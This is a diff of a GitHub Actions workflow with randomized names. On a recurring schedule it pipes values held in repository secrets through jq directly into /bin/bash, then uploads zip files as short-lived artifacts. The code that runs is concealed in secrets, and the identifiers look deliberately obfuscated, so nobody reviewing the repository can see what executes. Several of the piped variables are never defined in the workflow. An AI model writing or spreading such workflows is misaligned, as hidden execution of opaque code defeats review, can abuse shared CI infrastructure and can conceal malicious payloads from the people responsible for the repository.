@@ -1,24 +1,27 @@
 name: xilvyangkai
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '39 3/6 * * *'
-jobs:  # 29554
+    - cron: '28 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xilvyangkai
         env:
-          jyxu6: ${{ secrets.jyxu6 }}
+          akiy4: ${{ secrets.akiy4 }}
         run: |
-          echo $jyxu6 | jq -r .hsylt90 | /bin/bash
-          echo $aenjn8293 | jq -r .dr77977 | /bin/bash
-          echo $zwofq1508 | jq -r .p65685 | /bin/bash
-          echo $potxi41311 | jq -r .iik59271 | /bin/bash
-          echo $nch83827 | jq -r .gdctr87413 | /bin/bash
-          echo $jasu84 | jq -r .u3096 | /bin/bash
-          echo $kgr25 | jq -r .zgzmg433 | /bin/bash
-          echo $jwep4 | jq -r .bmg016 | /bin/bash
-          echo $imj1194 | jq -r .hoa3 | /bin/bash
+          printf '%s' "$akiy4" | jq -r .z33939 | /bin/bash
+          printf '%s' "$hxhfh871" | jq -r .z519 | /bin/bash
+          printf '%s' "$enee42341" | jq -r .s624 | /bin/bash
+          printf '%s' "$lnnrf4" | jq -r .x7752 | /bin/bash
+          printf '%s' "$rqhtn4800" | jq -r .isk598 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: xFQd8WM8
+          path: "*.zip"
+          retention-days: 1
